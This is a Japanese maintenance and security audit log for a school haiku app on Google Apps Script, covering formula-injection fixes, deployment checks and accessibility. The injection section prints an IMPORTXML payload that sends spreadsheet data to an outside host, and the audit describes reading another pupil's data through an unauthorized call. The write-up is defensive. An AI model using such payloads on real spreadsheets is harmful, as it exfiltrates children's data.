# GIGA句会プラザ 点検記録

- **[2026-08-22 の改修（最新）](#2026-08-22-の改修表計算のなかで数式として動き出す経路を塞いだ)** … 児童の入力が数式になる経路
- [v5 監査（2026-08-08）](#giga-standard-v5-監査2026-08-08) … 監査の全体
- [付録：v4 での改修記録（2026-08-03）](#付録v4-での改修記録2026-08-03) … CDN 依存を外したときの記録

---

# 2026-08-22 の改修：表計算のなかで数式として動き出す経路を塞いだ

## 何が起きえたか

Google スプレッドシートは、`=` `+` `-` `@` で始まる文字列を**数式として保存する**。
このアプリは児童の入力を `appendRow` にそのまま渡していたので、上の句に

```
=IMPORTXML("https://example.com/?"&俳句!D2,"//x")
```

と書いて投稿すると、**先生がその表計算ファイルを開いた瞬間に**学級の句が外の
サーバーへ送られる。児童の画面には何も起こらない。先生の画面にも「数式が入って
いる」以外の合図は出ない。広場に並ぶのは投稿された文字そのものなので、
**画面を見ていても気づけない。**

素通しだった書き込み先（実測）:

| 経路 | 列 | 誰が書けるか |
|---|---|---|
| `submitHaiku` | 名前・俳句・上の句・中の句・下の句・投稿者ID | 児童（URL を知っていれば誰でも） |
| `submitComment` | コメント・コメント投稿者 | 同上 |
| `submitVote` | 投票者ID | 同上（端末の印は児童の手元にあり、書き換えられる） |
| `updateSettings` | お題 | 先生 |

## どう直したか

`code.gs` に `safeCellText_()` を置き、セルへ書く前に必ず通すようにした。
先頭が `=` `+` `-` `@`・タブ・改行なら `'` を足す。`'` は表示にも
`getValue()` の戻り値にも出ないので、句もマイページの突き合わせも
これまでどおり動く（下の検査で確かめている）。

## 確かめたこと（2026-08-22 実測）

```
$ npm run check
  ✅ 生成物が原本と一致（app.html / css.html / vendor.html に差分なし）
  ✅ 品質ゲート 13 件中 13 件
  ✅ 品質ゲートの自己検証 13 件中 13 件（わざと壊すと落ちる）
  ✅ 管理者APIの認可 6/6
  ✅ 表計算に数式として書かれないか 14/14
```

- 検査そのものも壊して確かめた。`code.gs` から `safeCellText_()` の呼び出しを
  外すと、`npm run check:cell` は **9 件が通ってしまった**と報告して落ちる。
- 品質ゲートに 13 件目「児童の入力をセルに書く前に無害化している」を足した。
  `appendRow` / `setValue` の**16 か所**を読み、`quality.config.json` の
  `無害化する値` が素通しで渡っていないかを見る。

## 併せて直した：本番反映が検査を1つも通っていなかった

`main` にマージすると走る Deploy（`.github/workflows/deploy.yml`）は、
`package.json` の `quality` / `ci` / `check` を順に探して、**どれも無ければ
「飛ばします」と表示して検査ゼロのまま Apps Script へ push する。**
このリポジトリには3つとも無かった。CI では生成物の一致も管理者認可も見ていたのに、
**本番へ出る経路では全部飛んでいた。**

`npm run check` を用意し、CI 側も同じ `check:*` を呼ぶ形にそろえた
（検査の中身が2か所に分かれると、また片方だけを見る状態に戻るため）。

> 反映経路の実測: Deploy の直近の run（32546329975）は 12 秒・全ステップ
> skipped。シークレット（`GAS_SCRIPT_ID` ほか）が未登録なので、**いまは
> main にマージしても本番の Apps Script は動いていない。**
> 登録した日から、この `npm run check` が本番の手前に立つ。

## 併せて：紹介記事と手順書の数字を測り直した

`docs/note/giga-kukai-plaza-note-article.md` は、毎朝 giga-school.com が取りに来て
`giga-school.com/apps/haiku-meeting/` の紹介ページに組み直している正本。
記事を直すのはここで、**あちらの HTML を直しても翌朝の実行で消える**。

直したところ（すべて実測またはコードと突き合わせて確かめた）:

| 箇所 | 前 | 後 | なぜ |
|---|---|---|---|
| 書き出しの1段落 | 25 文字 | 63 文字 | 紹介ページの `<meta name="description">` と og:description は**書き出しの1段落だけ**から作られる（`tools/lib/article-page.mjs` の `summaryOf`）。25 文字では検索結果にも SNS のカードにも中身が出ない |
| 自分の句への投票 | 「欄が出ません」だけ | 画面側の制御であることを追記 | MANUAL.md の一覧と `code.gs` の `getPlazaData` のコメントは「自己申告なので、これで守られるのは事故だけ」と書いてあった。記事だけが強く読めていた。併せて、同じ賞・同じ句への二重投票は**サーバー側**で弾いていることも書いた |
| 公開の設定 | 「学校の方針に合わせて選びます」 | 「同一ドメインの全員」を推奨し、匿名を選ぶときの注意を追記 | README.md の手順にある警告（URL を知っていれば誰でも投稿・投票できる）が記事に無かった |
| 見出し「合言葉を変えてください」 | — | 「合言葉を決めてください」 | 初期パスワードを廃止したので、変えるものは無い。本文はすでに「はじめは決まっていません」と書いており、見出しだけが前の版のままだった |
| 最初に読み込む量 | 250 キロバイト | 256 キロバイト | 実測 index 1.2 ＋ vendor 156.5 ＋ css 32.4 ＋ app 65.8 = 255.9 KB |
| README.md の貼り付け表 | app 52 KB / css 28 KB | app 66 KB / css 32 KB | `docs/note/README.md` が 2026-08-08 に「ずれている」と記録したまま残っていた |

紹介ページ側の道具（`GIGAyama.github.io/tools/lib/`）で組み直して確かめた:

```
いまの本番（main） … 説明文 25 文字 / 画像 24 枚 / 見出し 19
この改修後        … 説明文 63 文字 / 画像 24 枚 / 見出し 19
```

## 併せて：haiku-meeting.giga-school.com が白い画面だった

`CNAME` があるので GitHub Pages はリポジトリ直下を配っている。その直下の
`index.html` は **GAS 用のテンプレートそのもの**で、`<?!= include('vendor'); ?>` 等が
入っていた。この記法はブラウザには意味が無く黙って捨てられるので、
配られるのは**タイトルだけの白い画面**になる。エラーも案内も出ない。

そこを指していたリンク（実測）:

| どこ | リンク |
|---|---|
| giga-school.com トップのカード | 見出し・「開く」・コピー・共有ボタン・JSON-LD の `url` |
| 紹介記事 | 主ボタン「GIGA句会プラザ を開く」 |
| `privacy.html` / `terms.html` | 「← Haiku-meeting に戻る」 |

**2026-08-22、人が実際にブラウザで開いて白いことを確認した。**

### どう直したか

配布形式が「先生ごとにデプロイ」である以上、このドメインからアプリ本体は開けない。
開けるのは各先生の `/exec` だけなので、トップに置くべきは**導入案内**である。

- アプリの外枠 `index.html` → **`app-shell.html`** に改名（`code.gs` / `.claspignore` /
  `tailwind.config.js` / `quality.config.json` をそろえた）
- 新しい `index.html` は導入案内のページ。外部から読むものは 0 で、
  画面写真は同じドメインの `docs/note/images/` から出す
- **すでに `index` で貼ってある学級のために、`code.gs` は `app-shell` を先に探し、
  無ければ `index` に落ちる**（`shellTemplate_()`）。名前を変えただけで授業中に
  画面が出なくなるのを避けるため

### 検査

- `tests/gas-shell-template.test.mjs` を新設。「いまの貼り付け」「前の版のまま」
  「どちらも貼り忘れ」の 3 つの状況で `doGet` を動かし、読みに行くファイル名を見る。
  6 件すべて意図どおり。
- 品質ゲートに 2 件足して 15 件にした（`--self-test` も 15/15）。
  - **サイトのトップが GAS のテンプレートのままではない**（`index.html` に `<?` が無いこと。
    ファイルが無いときも落とす。「無い」を緑にすると誰も気づけない）
  - **code.gs が読む外枠のファイルがある**（`SHELL_FILE_` の名前と実ファイルの一致）

## この改修で直していないもの

- **`submitHaiku` / `submitComment` にロックが無い**（C1 の指摘のまま）。
  40 人が一斉に送る場面で、`new Date().getTime()` の重複と行の取りこぼしが起きうる。
- **投票の身元が端末の localStorage の文字列だけ**。別の端末・別のブラウザで
  開き直せば同じ子がもう一度三票を使える（MANUAL.md に明記済み）。
  数式の無害化はこれを直さない。
- **紹介ページの説明文は、書き出しの1段落だけで決まる**（`GIGAyama.github.io` 側の
  `summaryOf`）。31 本のうち 3 本が 25 文字以下、12 本が 45 文字以下だった（実測）。
  この改修では**この記事の書き出しを厚くしただけ**で、道具そのものは直していない。
  ほかの 30 本の元原稿がこの環境から読めず、直したときの影響を測れないため。
- **`appsscript.json` に `webapp`（executeAs / access）が無い。**
  `clasp push` は GAS 側のマニフェストを丸ごと上書きするため、シークレットを
  登録して自動反映を始めた日に、**ウェブアプリの入口の設定が消える**おそれがある。
  値は本番のデプロイ設定と一致していなければならず、手元では確かめられない。
  `oauthScopes` を書かない判断（B3）とは別の話なので、次の入口として残す。

---

# 2026-08-23：既定の入口を DOMAIN にした

人の判断で、`appsscript.json` の `webapp.access` を
`ANYONE_ANONYMOUS`（全員・匿名を含む）から **`DOMAIN`（同一ドメインの全員）** に変えた。

## なぜ

README も紹介記事も「同一ドメインの全員」をすすめているのに、マニフェストの既定は
匿名を含む全員だった。**コピーで配ったテンプレートの既定もそれになる**ので、
何も考えずにデプロイした先生の学級が、URL を知っていれば校外の人でも書き込める
状態で始まってしまう。すすめている値と既定を一致させた。

## この変更で起きること

**次の自動反映で、公開中のアプリの入口が変わる。**`clasp push` はマニフェストを
丸ごと上書きし、`clasp deploy` がその設定で新しいバージョンに差し替えるため。

- 学校の Google アカウントでログインしている児童 … これまでどおり
- ログインしていない・学校アカウントを持たない児童 … **入れなくなる**

**児童が学校のアカウントを持たない学級では、GAS 側のデプロイ設定を
`ANYONE_ANONYMOUS` に戻し、あわせてこのリポジトリの `appsscript.json` も戻すこと。**
リポジトリだけ `DOMAIN` のままにすると、次の自動反映でまた戻ってしまう。

---

# 2026-08-23：自動反映を初めて走らせ、マニフェストの穴を塞いだ

シークレットが登録され、Deploy を初めて実行した（run 5・再実行）。**結果は失敗。
ただしこれは防御が働いた結果で、GAS には一切触れていない。**

## 分かったこと（実測）

| ステップ | 結果 |
|---|---|
| Check deployment secrets | ✅ 3つとも登録済み |
| Run quality gate | ✅ **本番反映の手前で `npm run check` が本当に走った**（ログに全出力） |
| Install clasp | ✅ |
| Deploy | ❌ `assertSafeToPush()` が停止 |
| Upload pre-push snapshot | ✅ 成果物に本番の中身 8 ファイル |

### 本番の GAS は、3月の版のままだった

控えに入っていたのは `コード.gs` / `index.html` / `plaza.html` / `mypage.html` /
`admin.html` / `ui_components.html` / `archives.html`。
`plaza.html` がこのリポジトリから消えたのは **2026-03-05**。

**つまり教室で動いているのは 3 月上旬の版**で、CDN 依存の除去（8/3）も、管理者APIの
認可（8/20）も、数式の無害化も、シートの点検も届いていない。
自動反映を通せば、既存デプロイの差し替え（URL は変わらない）で全部いっぺんに届く。

### 本番のマニフェストには `webapp` があった

成果物の `appsscript.json` を人が読んで持ってきた値:

```json
"webapp": { "executeAs": "USER_DEPLOYING", "access": "ANYONE_ANONYMOUS" }
```

リポジトリ側には無かった。**このまま push していたら、公開中のアプリの入口の設定が
消えるところだった。**同じ値をリポジトリへ写し、品質ゲートに 16 件目
「appsscript.json に Web アプリの入口が書いてある」を足した（`--self-test` も 16/16）。

`oauthScopes` は本番にも無い。B3 の判断（自動推定に任せる）と一致しているので、
そのままにした。

## 2 回目（run 6・04:09）で、本番へ届いた

人が GAS エディタで古いファイルを消したあと、`main`（PR #12 のマージ）で自動的に走り、
**成功した。**

```
$ clasp pull
└─ dist/gas-before-push/appsscript.json
Pulled one file..                       ← 控えは appsscript.json だけ＝消える物なし
$ clasp push --force
Pushed 6 files at 4:10:09 AM.
└─ app-shell.html / app.html / appsscript.json / code.gs / css.html / vendor.html
$ clasp deploy --deploymentId *** --description 42ee6eb…
Deployed *** @10
Webアプリを新しいバージョンへ更新しました（URLは変わりません）。
```

**バージョン 10 として既存デプロイを差し替えた。exec URL は変わっていない。**
3月上旬の版から、5 か月ぶんの改修（CDN 依存の除去・管理者APIの認可・数式の無害化・
外枠の改名・コンテナバインド対応・シートの点検）が一度に届いた。

**これで「main にマージすれば本番に届く」経路が、実測で通った。**

## まだ残っていること

- **ブラウザでの確認は未実施。**この環境からは開けない。人が見るべきものは
  下の「初回の反映後に見ること」に書いた。
- **`assertSafeToPush()` は `.claspignore` を見ていない。**リポジトリに同名の
  ファイルがあれば「安全」と数えるので、**送らないファイル（いまの `index.html` は
  サイトのトップ）と同名のものが本番にあると、警告なしに消える。**
  `scripts/gas-deploy.mjs` は正本のコピーなので、直すなら
  `GIGAyama.github.io/standards/gas/gas-deploy.mjs` が先。

## 初回の反映後に見ること

1. **先生用タブを、児童より先に開く。** `access` は `ANYONE_ANONYMOUS` で、
   合言葉が未設定なら**最初に開いた人が決められる**。3月の版から引き継いだ
   平文の `ADMIN_PASSWORD` があれば `migrateAdminPassword_` がハッシュへ移す。
2. **先生の管理画面に黄色い枠が出ていないか。** 3月の版のスプレッドシートは
   列の作りが違うかもしれない。違えば `checkSheets_` がそこに出す。
   出ていたら、**投票の締め切りはできない**（実名が別の列に入るため）。
3. 「過去」「自分」タブに、これまでの句が残っているか
   （`getDbSpreadsheet()` が `DB_SPREADSHEET_ID` の表計算に落ちているかの確認）。
4. 1 句だけ投稿して、スプレッドシートに行が増えるか。

---

# 2026-08-23：コピーリンクを差し込み、配り方を切り替えた

テンプレートのスプレッドシートができたので、配るリンクを3か所に入れた。

```
https://docs.google.com/spreadsheets/d/19VeKs838Yp8J4Xlxq4FWNfvmUj8u8ta31s2qOXGif0k/copy
```

| 場所 | 前 | 後 |
|---|---|---|
| `README.md` | ［コピーリンク：未設定］ | 手順 A の1行目にリンク |
| `index.html`（サイトのトップ） | 貼り付け手順 6 手 | コピーのボタン＋4 手。貼り付けは README へ誘導 |
| 紹介記事 | 「貼り付ける手順」7 手 | 「入れる手順」5 手。コピーできない学校向けに貼り付けも併記 |

**貼り付けの道は消していない。**学校のポリシーで外部ファイルのコピーが禁じられている
ことがあり、そこで詰まると入れる手立てが無くなるため。

## 反映経路（この時点での実測）

- サイトのトップ … マージすれば GitHub Pages が配り直す
- 紹介記事 … 翌朝 6:17（日本時間）の `sync-updates` が giga-school.com を組み直す
- **GAS 本体 … 2026-08-23 にシークレットが登録された。**登録後の Deploy はまだ 1 回も
  走っていない（直近の run 5 は 00:01、全ステップ skipped）。**この環境からは
  `workflow_dispatch` を叩けない**（GitHub API が 403 `Resource not accessible by
  integration` を返す）ので、実行は人の操作が要る。

### ⚠️ 初回の本番反映で気をつけること

`clasp push` は GAS 側のマニフェストを**丸ごと上書きする**。リポジトリの
`appsscript.json` は 6 行しかなく、`webapp`（executeAs / access）を持っていない。
**いま本番に入っている入口の設定が消えるおそれがある**（schoolplan_editor で実際に発生）。

`scripts/gas-deploy.mjs` は push の前に `dist/gas-before-push/` へ控えを取り、
ワークフローが `if: always()` でそれを成果物として上げる。**初回の run の成果物に、
上書き前の本物の `appsscript.json` が入る。**その中身を見てから
リポジトリ側に `webapp` を書き足すのが、値を推測せずに済む唯一の道。

---

# 2026-08-22 の改修（その3）：シートの列がずれたときに、気づけるようにした

## 何が見えていなかったか

`ensureSheets_()` が見ていたのは **シートが1枚あるかどうかだけ**だった。
`SHEETS_` に見出しの定義はあったが、使うのは新しく作るときだけで、
**既にあるシートの見出し・並び・列数は誰も確かめていなかった。**

このアプリは列を番号で読み書きしている（実測: `code.gs` に列番号での参照が 27 か所、
書き込みが `getRange(i + 1, 8)` ＝得点、`getRange(i + 1, 10)` ＝ミュート、
`getRange('I2:I' + lastRow)` ＝締切時の作者名）。

「俳句」シートの前に **1列挿されるだけ**で、次のことが**画面に何も出ないまま**起きる。

- `row[10]`（投稿者ID）が空になり、「自分」タブに自分の句が出ない
- `row[9]`（ミュート）がずれ、隠したはずの句が広場に戻る
- 得点が、得点でない列に書き込まれる
- 締め切ったときに **実名が別の列に入り、`row[8]` として全員の画面に流れる**

MANUAL は「誤字はスプレッドシートで直すのが確実」と案内している。コピー配布にしたので、
先生の手元にあるのは自分のファイルである。**起こりうるものとして扱う。**

## 直した方針：自動で直すのは、直しても事故にならないものだけ

| 状況 | どうするか |
|---|---|
| シートが無い | 作る（これまでどおり） |
| シートはあるが1行も無い | **見出しを書き戻す**（中身が無いので安全） |
| 見出しがちがう・列がずれている・列が多い | **直さない。** 見つけたことを言うだけ |

見出しだけ書き換えると、**ずれた中身に正しいラベルが付いて事故が見えなくなる。**
いちばん避けたい壊れ方なので、ここは人の手に残す。

## 知らせ方

- **スプレッドシートのメニュー**「GIGA句会プラザ ▸ シートを点検する」（`onOpen`）。
  コンテナバインドにしたので置けるようになった
- **先生の管理画面**に黄色い枠で出す（`getAdminDashboardData` の `sheetIssues`）
- **児童の画面は止めない。** 授業中に全員が止まるほうが害が大きい

### 1つだけ止めるところ

**列がずれているときは、投票を締め切れない。** 締め切りは B列（名前）を I列（公開名）へ
書き戻す操作で、ずれていると実名が別の列に入り、広場に流れる。
`updateSettings` の**いちばん先**で点検し、断る（お題も投票状況も書き換えないので、
中途半端な状態にならない）。

## 検査

`tests/gas-sheet-shape.test.mjs` を新設。9 つの場面で 16 件、すべて通った。

- 正常なコピー／見出しの字が変えられた／前に1列挿された／余分な列が足された
- 空のシートには見出しを書き戻し、**中身のあるシートの見出しは書き換えない**
- 締め切り: ずれていたら断り、**設定シートも書き換えない**／正常なら通る
- 先生の管理画面に所見が届く
- 点検メニューは、児童から呼ばれても**シートを1枚も読まずに終わる**
  （`SpreadsheetApp.getUi()` を先に取る）

点検を空にすると 9 件が落ちる（確認済み）。

なお、この改修で `tests/gas-admin-auth.test.mjs` の代役シートに `getLastColumn` /
`getMaxColumns` と数字指定の `getRange` を足した。**本番で使う API を代役が持って
いなかった**ためで、検査の連鎖がそれを見つけた。

## 残っているもの

**根本対策は「列番号ではなく見出し名で引く」こと。** 27 か所の書き換えになるので、
この PR には入れていない。点検が入ったので、ずれは黙って進まずに見えるようになった。

---

# 2026-08-22 の改修（その2）：スプレッドシートのコピーで配れるようにした

## なぜ

いまの導入は「`script.new` を開き、`code.gs` と HTML 4 つを手で貼る」。
事故はほぼ全部ここで起きる。名前が 1 文字違えば真っ白、`vendor` の 157 KB が
途中で切れても真っ白、しかもどちらも画面には何も出ない。

作品を入れるスプレッドシートにスクリプトを束ねて（コンテナバインド）
**ファイルのコピーで配れば、この貼り付けが丸ごと要らなくなる。**

## どう直したか

`getDbSpreadsheet()` が、束ねられたファイルの有無を見て分かれる。

| 状況 | 使うファイル |
|---|---|
| コピーで配った（コンテナバインド） | `SpreadsheetApp.getActiveSpreadsheet()` が返すそのファイル |
| 前の配り方（独立スクリプト）で公開済み | これまでどおり `DB_SPREADSHEET_ID` の表計算ファイル |
| 同上・まだ一度も開かれていない | これまでどおり自動生成 |

**すでに公開している学級を止めないことが、この改修のいちばんの要件。**
新しい経路だけにすると、その学級では作品が 1 つも見えなくなる。

副産物として、`SHEETS_` と `ensureSheets_()` にシートの定義を 1 か所へまとめた。
先生が誤ってシートを 1 枚消しても、次に開いた人が作り直す（**C2 の指摘に一部対応**。
中身は戻らないが、`TypeError` で画面が出なくなることは無くなる）。
足りないシートが無いときはロックを取らないので、朝の一斉アクセスで並ばない。

## 検査

`tests/gas-container-bound.test.mjs` を新設。4 つの状況（コピー配布／公開済みの
独立スクリプト／未使用の独立スクリプト／シートを 1 枚消した）で 12 件、すべて通った。
コンテナバインドの経路を消すと 5 件が落ちる（確認済み）。

## まだ終わっていない

- **コピーリンクが未設定。** テンプレートのスプレッドシートは Google アカウントを
  持つ人にしか作れない。作り方と貼る場所は `docs/copy-distribution.md` にある。
- **公開されるページ（サイトのトップ・紹介記事）は手を入れていない。**
  リンクが実在しないうちに「コピーを作る」ボタンを置くと、直したばかりの
  白い画面と同じことになる。リンクが決まってから同じ 1 コミットで差し替える。
- **本番では未確認**（この環境から GAS は触れない）。とくに次の 2 点は実機で 1 回:
  - ウェブアプリ文脈で `getActiveSpreadsheet()` が束ねられたファイルを返すこと
  - 学校のドメインから、作者のテンプレートを実際にコピーできること
    （外部ファイルのコピーを禁じている学校では止まる。その場合は貼り付け手順のまま）

---

# GIGA Standard v5 監査（2026-08-08）

**数字はすべて実測。測っていないものは「未計測」と書く。**

> **この章は「直したあと」の状態を示している。** 監査時に見つかった指摘と、
> それをどう直したかを並べてある。「前 → 後」の要約は
> [§対応の結果](#対応の結果前--後) にある。

## 測り方

本番（`script.google.com`）へは作業環境から到達できないため、§7-3 の手順で
**GAS が返す画面と同じものを手元で組み立てて**測った。

1. `index.html` の `<?!= include('vendor'/'css'/'app'); ?>` を実体に置き換える
2. `google.script.run` をダミーに差し替え、**戻り値の見本**を与えて本編まで進める
   （一覧が空だと一覧のある画面が測れないため、俳句5句・コメント2件・
   過去の句会2回・管理ダッシュボードの統計を与えた）
3. 投票受付中と投票締切の2通りを用意し、9画面を歩いて測った

計測環境：Chromium 141.0.7390.37（Playwright 1.62.1）、1280×900 / DPR 2。

**この作業環境は `fonts.googleapis.com` へ出られない。**
つまり Web フォントが塞がれた学校とまったく同じ状態で測っている。

> ⚠️ §5 の注意に従い、viewport は `index.html` だけでなく `code.gs` の
> `addMetaTag` も読んで確認した（`addMetaTag` はサーバー側の処理なので、
> 手元で組み立てた画面には現れない）。

### 検査そのものを、わざと壊して確かめた

§P4 のとおり、「0件でした」だけでは検査が動いているのか区別できないため、
判定器に既知の良品・不良品を通した。

| わざと入れたもの | 期待 | 結果 |
|---|---|---|
| 白地に `#cbd5e1` の 14px 文字 | 検出する | ✅ 検出した |
| 濃いグラデーションの上の白文字 | 検出しない | ✅ 検出しなかった |
| 20×20 のボタン | 検出する | ✅ 検出した |
| `tap-44`（当たり判定だけ 44px） | 検出しない | ✅ 検出しなかった |

**この確認で、判定器そのものの不具合が2件見つかった。**

| 不具合 | 中身 |
|---|---|
| 半透明の面で色が壊れる | `getImageData` は**非プリマルチプライ**の値を返すのに、さらにアルファで割っていた。`bg-white/20` が `255/0.2 = 1275` になり、**白文字が「白地の上」と誤判定**されていた |
| グラデーションの上を全部誤検出 | グラデーション要素は `backgroundColor` が透明。そのまま祖先を遡ると背後の白まで抜け、比 1.04 と誤報。**色の止まりをすべて候補にして、いちばん悪い止まりで判定**するようにした |

直す前は 43件、直したあとは **9件**。**前者の 34件はでたらめだった。**

---

## A. 法務・配布

| # | 項目 | 判定 | 実測 |
|---|---|:--:|---|
| A1 | LICENSE 実ファイル | ✅ | MIT、リポジトリ直下にあり |
| A2 | `.gitignore` | ✅ | `node_modules/` と Tailwind の中間ファイルを除外 |
| A3 | `dependabot.yml` | ✅ | `.github/dependabot.yml` あり |
| A4 | README / MANUAL / AUDIT | ✅ | 3点そろい。2026-08-08 に実装との食い違いを修正済み |
| A5 | 🆕 `package-lock.json` | ✅ | **追加した。** 以前は無く `npm ci` が必ず失敗していた。版が固定されず、`npm install` のたびに canvas-confetti が 1.6.0→1.9.4 に上がり生成物が変わっていた（実測）。いまは `npm ci && npm run build` が出荷済みの3ファイルをバイト単位で作り直す |

## B. セキュリティ

| # | 項目 | 判定 | 実測 |
|---|---|:--:|---|
| B1 | CSP（入れたうえで動作確認済み） | ❌ | 未設定。GAS は `HtmlService` が独自のサンドボックスで包むため、`<meta>` の CSP がどう働くかは**本番で確かめないと判断できない**（未計測） |
| B2 | 秘密情報・IDの直書きなし | ⚠️ | パスワードは `PropertiesService` にあり ✅。ただし `code.gs:73` の `setFaviconUrl` に Google ドライブのファイル ID を直書き（公開アセットなので実害は小さいが、Part IV の「ID の直書き」に該当） |
| B3 | OAuth スコープ最小 | ⚠️ | `appsscript.json` を追加し V8 / Asia/Tokyo を明示した。**`oauthScopes` はあえて書いていない。** `SpreadsheetApp.create()` を使うためスコープの粒度が粗く、外して間違えると全教員で認可が通らなくなる。§5 に従い、本番で確かめられないうちは自動推定に任せる |
| B4 | `postMessage` の宛先が `*` でない | ✅ | `postMessage` 不使用 |
| B5 | **サーバー側5段ガード** | ✅ | **直した。** 以前は管理者APIに認可がまったく無かった。下表参照 |
| B6 | 🆕 CDN から取る実行コードが 0 | ✅ | **0 バイト。** コメント内の記述に反応した誤検知を除き、実際の `<script src>` は皆無。唯一の外部参照は Google Fonts（見た目だけ・§2-7 の許容範囲） |
| B7 | 🆕 残る外部資産に SRI と版の固定 | — | 該当なし（外部から読む実行コードが無い） |
| B8 | 🆕 入力をセルに書く前の無害化 | ✅ | **2026-08-22 に直した。** 素通しだった6経路すべてを `safeCellText_()` に通す。[上の章](#2026-08-22-の改修表計算のなかで数式として動き出す経路を塞いだ)を参照 |

### B5 の中身（**いちばん重い指摘**）

`code.gs` の管理者向け関数を1つずつ調べた。`google.script.run` の引数は
すべて改ざん可能として扱う必要があるが（Phase 4-1）、実際は次のとおり。

| 関数 | 認可チェック | 誰でも呼べると何が起きるか |
|---|:--:|---|
| `changeAdminPassword` | ✅ もとからあり | — |
| `updateSettings` | ❌ **なし** → ✅ | 児童が投票を勝手に締め切れた。**締め切ると全員の本名が公開される** |
| `toggleMuteHaiku` | ❌ **なし** → ✅ | 児童が他人の作品を広場から消せた |
| `resetKukai` | ❌ **なし** → ✅ | 児童が句会を勝手に終わらせられた（データは過去シートに残るが、その回は締め切り前なので**全員が「（作者非公開）」で確定**する） |
| `getAdminDashboardData` | ❌ **なし** → ✅ | **投票受付中でも全員の本名が取れた**（画面上は伏せている情報） |
| `getPlazaData` | ❌ **漏れていた** → ✅ | **監査で見落としていた。** 作者名を、投票中かどうかに関係なく全児童の端末へ返していた。画面では伏せていたが開発者ツールで見える。締め切るまで送らないようにした |

加えて `checkAdminPassword` は画面から何度でも叩けるため、
**初期パスワード `1234` に対する総当たりを止めるものが無かった。**

> **追記（初期パスワードの廃止）**
> 初期値 `1234` そのものをやめた。`getDbSpreadsheet` は合言葉を書き込まず、
> 先生が最初に「先生」タブを開いたときに決める（`setupAdminPassword`）。
> 保存も平文をやめ、学級ごとの塩を混ぜた SHA-256 のハッシュだけを持つ
> （`ADMIN_PASSWORD_HASH`）。前の版から引き継いだ平文の `ADMIN_PASSWORD` は、
> 最初の照合のときにハッシュへ移して平文を消す。最短の長さは4文字から6文字にした
> （1秒の待ちがあっても、4桁の数字は総当たりが現実的な範囲に入るため）。

> Phase 4-2 の「フロントの出し分けは防御ではない」に真正面から該当する。
> 管理画面のボタンを隠していても、開発者ツールから直接呼べる。

合言葉が合ったときに使い捨ての合鍵を渡し、以降の操作はサーバー側で照合する形にした
（`CacheService` に6時間）。合言葉の総当たりには、締め出しではなく1回1秒の待ちを入れた
（締め出すと児童のいたずらで先生が入れなくなるため）。

`tests/gas-admin-auth.test.mjs` で、合鍵なしの6通りの呼び出しがすべて弾かれ、
正しい合言葉なら通ること、未設定のまま入れないこと、平文が残らないこと、
他人のマイページが読めないこと、投票中は作者名が空で締切後は出ることを確認している。

> **追記（`getMyHaikus` の認可漏れ）**
> `getMyHaikus(authorName)` は名前だけで絞っており、上の表から漏れていた。
> `google.script.run.getMyHaikus('花子')` と打てば、その子の全作品と、
> その子がもらったコメントまで読めた。名前は自己申告で合言葉ではない。
> このアプリは「実行するユーザー: 自分」で配るため、サーバー側で
> `Session.getActiveUser()` を見ても空になり、呼び出し元の児童を特定できない。
> そこで、投票の重複判定に使っている**端末ごとの識別子**（投票者ID）を
> 投稿時にも俳句シートの K列 に残し、それが一致する行だけを返すようにした。
> 完全ではない（同じ端末を別の子が使えば見える／端末を替えると自分の分も消える）が、
> 「他人の名前を打てば読める」状態は無くなる。

> **ただし §絶対安全規則 10 により、GAS 本体の変更は自動でマージしない。**
> `script.google.com` へ到達できず本番で動かせていないため、
> テストデプロイで確かめてから取り込むこと。

## C. 堅牢性

| # | 項目 | 判定 | 実測 |
|---|---|:--:|---|
| C1 | LockService + try/finally | ⚠️ | `submitVote` ✅（`finally` で解放）、`getDbSpreadsheet` ✅。`submitHaiku` はロック無し（`appendRow` のみなので実害は小さい）。`getDbSpreadsheet` の `catch` が**全ての例外を「アクセスが集中しています」に塗り潰す**ため、本当の失敗が見えない |
| C2 | 自動復旧（シート再生成） | ❌ | DB そのものは自動生成される ✅。しかし `getSheetByName` の戻り値を検査しているのは 17 か所中 **1 か所だけ**。先生が誤ってシートを1枚消すと、以降 `TypeError` で画面が出なくなる |
| C3 | `pagehide` で記録確定 | — | 端末側に保存する学習記録が無いため該当なし |
| C4 | 通信失敗時のリトライと明示 | ⚠️ | 失敗はトーストで明示 ✅、広場には「もう一度読み込む」あり ✅。自動リトライは無し |
| C5 | `localStorage.clear()` 不使用 | ✅ | 自アプリの `giga_` 接頭辞のキーのみ操作 |

## D. 表示（実ブラウザで9画面を走査）

| # | 項目 | 判定 | 実測 |
|---|---|:--:|---|
| D1 | viewport に `viewport-fit=cover` | ✅ | `index.html:10` と `code.gs:66` の**両方**にあり |
| D2 | `100dvh` を使用 | ✅ | `.h-screen{height:100dvh}` + `@supports not` で `100vh` フォールバック |
| D3 | `safe-area-inset` を適用 | ✅ | 3 か所（左・右・下） |
| D4 | `clamp()` による fluid type | ✅ | **入れた。** 児童が見る主役（お題・短冊の俳句・開いたときの俳句）に適用。実測：お題 320px 20px → 1280px 32px、俳句 18px → 26px |
| D5 | Canvas の DPR 補正 | — | Canvas 不使用（紙吹雪は canvas-confetti が内部で処理） |
| D6 | 320px 幅で横スクロールが出ない | ✅ | **320px / 375px × 5画面すべてで `scrollWidth == clientWidth`** |
| D7 | 画像に width/height、150KB以下 | — | 画像ファイルなし（アイコンはインライン SVG） |
| D8 | **コントラスト 4.5:1 以上** | ✅ | **9件 → 0件。** さらに、画面を歩くだけでは出ないトースト2種（成功 2.58／失敗 3.96）を別に測って直した。下表 |
| D9 | **タップ領域 44px 以上** | ✅ | **11件 → 0件。** 下表 |
| D10 | `prefers-reduced-motion`（`.01ms`） | ✅ | `.01ms` を使用（`0` ではない）。§2-10 の罠を回避済み |
| D11 | `forced-colors` 対応 | ✅ | あり |
| D12 | 提示モード | ✅ | **入れた。** 広場の「🖥 大きく表示」で字も余白も1.5倍＋全画面。提示中は受賞者名を既定で伏せる。実測：html 16px → 24px、俳句 56px |
| D13 | 印刷CSS | ✅ | **入れた。** A4縦。実測でヘッダー・フッター・操作ボタン・**紙吹雪**が消え、受賞3件が残ることを確認（紙吹雪は実際に刷ってみるまで気づけなかった）|
| D14 | 🆕 拡大を禁止していない | ✅ | `user-scalable=no` / `maximum-scale` ともに 0 件（`code.gs` も確認） |

### D8 コントラスト基準未満（5種・9件）

| 画面 | 文言 | 色 | 大きさ | 比 | 必要 | 直し方の案 |
|---|---|---|---|---:|---:|---|
| 広場 | 「投票受付中」 | `text-green-600` | 14px 太字 | **3.30** | 4.5 | `text-green-700`（→ 5.01） |
